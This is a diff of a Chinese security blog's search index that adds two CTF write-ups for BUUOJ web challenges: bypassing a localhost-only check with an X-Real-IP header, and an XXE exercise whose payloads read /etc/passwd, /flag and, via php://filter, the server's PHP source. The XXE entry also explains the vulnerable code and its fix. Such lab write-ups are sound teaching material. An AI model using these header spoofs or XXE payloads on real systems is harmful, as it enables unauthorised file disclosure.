@@ -4,6 +4,64 @@
   
     
     <entry>
+      <title>web-buuoj-(BUU BURP COURSE 1)</title>
+      <link href="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/"/>
+      <url>/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="一、题面"><a href="#一、题面" class="headerlink" title="一、题面"></a>一、题面</h1><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2018.53.19.png" style="zoom:50%;"><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2018.53.34.png" style="zoom:50%;"><p>提示只能本地访问。</p><h1 id="二、分析"><a href="#二、分析" class="headerlink" title="二、分析"></a>二、分析</h1><p>抓包：</p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2018.56.02.png" style="zoom:50%;"><p>提示：只能本地访问，可能是对请求来源进行了限制。</p><p>尝试用referer字段/x-forward-for字段。</p><ul><li>添加Referer字段</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Referer: http://localhostReferer: http://127.0.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2018.57.29.png" style="zoom:50%;"><p>没用。</p><ul><li>添加X-Forwarded-For</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">X-Forwarded-For: <span class="token number">127.0</span>.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2018.59.25.png" style="zoom:50%;"><p>没用。</p><h1 id="三、X-Real-IP"><a href="#三、X-Real-IP" class="headerlink" title="三、X-Real-IP"></a>三、X-Real-IP</h1><p><code>X-Real-IP</code> 是一个 HTTP 请求头字段，它用于在通过代理或负载均衡器转发请求时，保留原始请求的客户端 IP 地址信息。这个字段通常只在反向代理服务器中使用，用于表示原始请求的客户端 IP 地址。当请求经过反向代理服务器时，该服务器会将客户端的 IP 地址设置到 <code>X-Real-IP</code> 字段中，这样后端服务器可以通过读取 <code>X-Real-IP</code> 字段来获取原始请求的客户端 IP 地址。</p><p><code>X-Real-IP</code> VS <code>X-Forwarded-For</code>:</p><p><code>X-Real-IP</code> 与 <code>X-Forwarded-For</code> 不同，<code>X-Forwarded-For</code> 是一个标准的 HTTP 请求头字段，用于记录代理链中的每个代理服务器的 IP 地址，而 <code>X-Real-IP</code> 通常只包含一个 IP 地址，这个地址应该反映了发起请求的客户端的真实 IP。<code>X-Real-IP</code> 并不是标准的 HTTP 请求头字段，而是由某些特定的反向代理服务器（如 Nginx）引入的，因此，它的通用性和兼容性可能不如 <code>X-Forwarded-For</code>。</p><p>需要注意的是，由于 <code>X-Real-IP</code> 可以被伪造，因此在验证其真实性时，也需注意可能存在的 IP 伪造问题。在实际应用中，开发者需要了解如何正确配置和使用这些头部字段，并注意隐私问题，在使用客户端 IP 信息时要遵守隐私法规，不要在未经授权的情况下收集或存储敏感信息。</p><h1 id="四、解题"><a href="#四、解题" class="headerlink" title="四、解题"></a>四、解题</h1><p>添加<code>x-real-ip</code>:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">x-real-ip: <span class="token number">127.0</span>.0.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>注意：经过实际测试，可以忽略大小写：X-Real-IP也可以。</p></blockquote><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2019.11.17.png" style="zoom:50%;"><p>可以看到返回一个登录页面，包含一个form表单。</p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2019.13.43.png" style="zoom:50%;"><p>点击登录按钮，抓取POST数据包：</p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2019.14.10.png" style="zoom:50%;"><p>直接提交仍然会提示：只能本地访问。</p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2019.17.59.png" style="zoom:50%;"><p>添加X-Real-IP:127.0.0.1之后提交POST数据：</p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2019.18.30.png" style="zoom:50%;"><p>成功获得flag。</p><ul><li>测试POST数据包的最简形式：</li></ul><p>经过测试，如果想要手动构造POST数据包的话，最简形式如下：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST / HTTP/1.1Host: node5.buuoj.cn:26861Content-Type: application/x-www-form-urlencodedX-Real-IP: <span class="token number">127.0</span>.0.1<span class="token assign-left variable">username</span><span class="token operator">=</span>admin<span class="token operator">&amp;</span><span class="token assign-left variable">password</span><span class="token operator">=</span>wwoj2wio2jw93ey43eiuwdjnewkndjlwe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-burp-course-1/%E6%88%AA%E5%B1%8F2025-02-12%2019.35.45.png" style="zoom:50%;"><p>除了Host字段、解题必须的X-Real-IP字段外，保留Content-Type字段即可。</p><p>flag：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>c5766d2f-15bc-4ad2-b99f-4b4a2638717b<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本题目主要考察使用BP等代理工具修改请求包的方法，核心考点：</p><ul><li><p>1）修改/添加<code>X-Real-IP=127.0.0.1</code>，绕过本地访问限制。</p></li><li><p>2）yakit/BP修改数据包。</p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF实战 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web安全 </tag>
+            
+            <tag> CTF实战 </tag>
+            
+            <tag> burp工具 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>buuoj-(BUU-XXE-COURSE-1)</title>
+      <link href="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/"/>
+      <url>/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="一、题面"><a href="#一、题面" class="headerlink" title="一、题面"></a>一、题面</h1><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212204129119.png" alt="img"></p><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212204309278.png" alt="img"></p><p>界面是一个登录框。</p><h1 id="二、分析"><a href="#二、分析" class="headerlink" title="二、分析"></a>二、分析</h1><p>抓包：</p><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212204708007.png" alt="img"></p><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212204739020.png" alt="img"></p><p>可以看到提交的是一个xml文档，root元素下面有username和password两个元素。</p><p>想到使用XXE外部实体注入攻击读取服务器敏感文件。XXE漏洞的具体详解见本站<a href="#">《XML外部实体注入漏洞(XXE)》</a>一文。</p><h1 id="三、解题"><a href="#三、解题" class="headerlink" title="三、解题"></a>三、解题</h1><h2 id="3-1-payload构造"><a href="#3-1-payload构造" class="headerlink" title="3.1 payload构造"></a>3.1 payload构造</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"UTF-8"</span>?<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE root <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM <span class="token string">"file:///flag"</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>root<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>username<span class="token operator">&gt;</span>admin<span class="token operator">&lt;</span>/username<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>password<span class="token operator">&gt;&amp;</span>xxe<span class="token punctuation">;</span><span class="token operator">&lt;</span>/password<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>/root<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是没有回显。</p><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212210932947.png" alt="img"></p><p>观察响应内容，只有用户名被回显了，那么将外部实体的引用放在username标签中即可。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"UTF-8"</span>?<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE root <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM <span class="token string">"file:///etc/passwd"</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>root<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>username<span class="token operator">&gt;&amp;</span>xxe<span class="token punctuation">;</span><span class="token operator">&lt;</span>/username<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>password<span class="token operator">&gt;</span><span class="token number">1234</span><span class="token operator"><span class="token file-descriptor important">5</span>&lt;</span>/password<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>/root<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212211151503.png" alt="img"></p><p>成功读取到<code>/etc/passwd</code>文件的内容。</p><h2 id="3-2-获取flag"><a href="#3-2-获取flag" class="headerlink" title="3.2 获取flag"></a>3.2 获取flag</h2><p>只需要改变一下读取的文件即可：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"UTF-8"</span>?<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE root <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM <span class="token string">"file:///flag"</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>root<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>username<span class="token operator">&gt;&amp;</span>xxe<span class="token punctuation">;</span><span class="token operator">&lt;</span>/username<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>password<span class="token operator">&gt;</span><span class="token number">1234</span><span class="token operator"><span class="token file-descriptor important">5</span>&lt;</span>/password<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>/root<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212211354162.png" alt="img"></p><p>flag:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>e61193a8-c8ad-4238-9b97-b4e9a417d9c5<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-3-问题讨论"><a href="#3-3-问题讨论" class="headerlink" title="3.3 问题讨论"></a>3.3 问题讨论</h2><ul><li>必须是<code>&lt;!DOCTYPE root</code>吗？</li></ul><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212211604959.png" alt="img"></p><p>答案是否定的，DOCTYPE定义的根元素可以不是root。</p><ul><li>除了用file协议外，能用php://filter协议吗？</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?xml <span class="token assign-left variable">version</span><span class="token operator">=</span><span class="token string">"1.0"</span> <span class="token assign-left variable">encoding</span><span class="token operator">=</span><span class="token string">"UTF-8"</span>?<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">!</span>DOCTYPE xxx <span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token operator">!</span>ENTITY xxe SYSTEM <span class="token string">"php://filter/read=convert.base64-encode/resource=/flag"</span><span class="token operator">&gt;</span><span class="token punctuation">]</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span>root<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>username<span class="token operator">&gt;&amp;</span>xxe<span class="token punctuation">;</span><span class="token operator">&lt;</span>/username<span class="token operator">&gt;</span>     <span class="token operator">&lt;</span>password<span class="token operator">&gt;</span><span class="token number">1234</span><span class="token operator"><span class="token file-descriptor important">5</span>&lt;</span>/password<span class="token operator">&gt;</span> <span class="token operator">&lt;</span>/root<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212211806278.png" alt="img"></p><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212211840968.png" alt="img"></p><p>答案是肯定的。</p><p>可以进一步尝试读取index.php的源代码：</p><p><img src="/2025/02/13/ctf-shi-zhan/web-buuoj-buu-xxe-course-1/image-20250212212016331.png" alt="img"></p><p>base64解码后的内容是本关的源代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">libxml_disable_entity_loader</span> <span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'on'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$xmlfile</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DOMDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$dom</span><span class="token operator">-&gt;</span><span class="token function">loadXML</span><span class="token punctuation">(</span><span class="token variable">$xmlfile</span><span class="token punctuation">,</span> <span class="token class-name">LIBXML_NOENT</span> <span class="token operator">|</span> <span class="token class-name">LIBXML_DTDLOAD</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$info</span> <span class="token operator">=</span> <span class="token function">simplexml_import_dom</span><span class="token punctuation">(</span><span class="token variable">$dom</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token variable">$info</span><span class="token operator">-&gt;</span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"Your username: "</span><span class="token operator">.</span><span class="token variable">$payload</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>代码解析：</p><ol><li><code>$xmlfile = file_get_contents('php://input');</code><ul><li>从标准输入流中读取XML数据。<code>file_get_contents</code>函数用于读取文件内容，这里使用<code>php://input</code>来获取通过HTTP POST请求发送的原始XML数据。</li></ul></li><li><code>$dom = new DOMDocument();</code><ul><li>创建一个<code>DOMDocument</code>对象，用于解析XML数据。</li></ul></li><li><code>$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</code><ul><li>使用<code>loadXML</code>方法将读取到的XML数据加载到<code>DOMDocument</code>对象中。<code>LIBXML_NOENT</code>标志表示解析时会将实体引用替换为它们的值，<code>LIBXML_DTDLOAD</code>标志表示加载文档类型定义（DTD）。</li></ul></li><li><code>$info = simplexml_import_dom($dom);</code><ul><li>将<code>DOMDocument</code>对象转换为<code>SimpleXMLElement</code>对象，以便更方便地操作XML数据。</li></ul></li><li><code>$payload = $info-&gt;username;</code><ul><li>从<code>SimpleXMLElement</code>对象中提取<code>username</code>元素的值，并将其存储在变量<code>$payload</code>中。</li></ul></li></ol><p>这段代码存在严重的安全漏洞：</p><ul><li><strong>启用外部实体加载</strong>：<code>libxml_disable_entity_loader(false)</code>允许加载外部实体，这可能导致XML外部实体（XXE）攻击。攻击者可以通过构造恶意的XML数据来读取服务器上的文件或发起其他恶意行为。</li></ul><p>改进建议</p><ul><li>禁用外部实体加载：</li></ul><pre class="line-numbers language-none"><code class="language-none">libxml_disable_entity_loader(true);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p>本关主要考察XXE漏洞，考点包括：1）XXE漏洞读取敏感文件。2）<code>file://</code>和<code>php://filter/read</code>协议的利用。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF实战 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> web安全 </tag>
+            
+            <tag> CTF实战 </tag>
+            
+            <tag> XXE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>XML外部实体注入漏洞(XXE)</title>
       <link href="/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/"/>
       <url>/2025/02/12/web-an-quan/xml-wai-bu-shi-ti-zhu-ru-lou-dong-xxe/</url>
@@ -22,9 +80,9 @@
             
             <tag> web安全 </tag>
             
-            <tag> 漏洞知识库 </tag>
-            
             <tag> XXE </tag>
+            
+            <tag> 漏洞知识库 </tag>
             
         </tags>
       
@@ -51,9 +109,9 @@
             
             <tag> web安全 </tag>
             
-            <tag> SSRF </tag>
-            
             <tag> CTF实战 </tag>
+            
+            <tag> SSRF </tag>
             
             <tag> 哈希长度扩展攻击 </tag>
             
@@ -111,9 +169,9 @@
             
             <tag> web安全 </tag>
             
-            <tag> 文件上传 </tag>
-            
             <tag> CTF实战 </tag>
+            
+            <tag> 文件上传 </tag>
             
         </tags>
       
@@ -140,9 +198,9 @@
             
             <tag> web安全 </tag>
             
-            <tag> 文件包含 </tag>
-            
             <tag> CTF实战 </tag>
+            
+            <tag> 文件包含 </tag>
             
         </tags>
       
@@ -227,11 +285,11 @@
             
             <tag> web安全 </tag>
             
+            <tag> SSRF </tag>
+            
             <tag> 漏洞知识库 </tag>
             
             <tag> 服务端跨站请求 </tag>
-            
-            <tag> SSRF </tag>
             
         </tags>
       
@@ -289,9 +347,9 @@
             
             <tag> web安全 </tag>
             
-            <tag> 跨站脚本攻击 </tag>
-            
             <tag> CTF实战 </tag>
+            
+            <tag> 跨站脚本攻击 </tag>
             
             <tag> 存储型XSS </tag>
             
@@ -349,9 +407,9 @@
             
             <tag> web安全 </tag>
             
-            <tag> 漏洞知识库 </tag>
-            
             <tag> 文件包含 </tag>
+            
+            <tag> 漏洞知识库 </tag>
             
         </tags>
       
@@ -463,9 +521,9 @@
       
         <tags>
             
-            <tag> 跨站脚本攻击 </tag>
-            
             <tag> CTF实战 </tag>
+            
+            <tag> 跨站脚本攻击 </tag>
             
             <tag> xss-labs </tag>
             
@@ -494,9 +552,9 @@
             
             <tag> web安全 </tag>
             
-            <tag> XSS </tag>
-            
             <tag> 跨站脚本攻击 </tag>
+            
+            <tag> XSS </tag>
             
         </tags>
       
@@ -726,11 +784,11 @@
       
         <tags>
             
+            <tag> 内网攻防 </tag>
+            
             <tag> 攻防工具库 </tag>
             
             <tag> 内网扫描 </tag>
-            
-            <tag> 内网攻防 </tag>
             
             <tag> fscan </tag>
             
@@ -815,13 +873,13 @@
       
         <tags>
             
+            <tag> 攻防工具库 </tag>
+            
             <tag> webshell管理 </tag>
             
             <tag> 哥斯拉 </tag>
             
             <tag> Godzilla </tag>
-            
-            <tag> 攻防工具库 </tag>
             
         </tags>
       
@@ -1521,9 +1579,9 @@
       
         <tags>
             
-            <tag> React和Flask </tag>
-            
             <tag> 前后端开发 </tag>
+            
+            <tag> React和Flask </tag>
             
         </tags>
       
@@ -1739,11 +1797,11 @@
       
         <tags>
             
+            <tag> 密码学算法安全 </tag>
+            
             <tag> padding oracle攻击 </tag>
             
             <tag> web安全中的密码学攻击 </tag>
-            
-            <tag> 密码学算法安全 </tag>
             
         </tags>
       
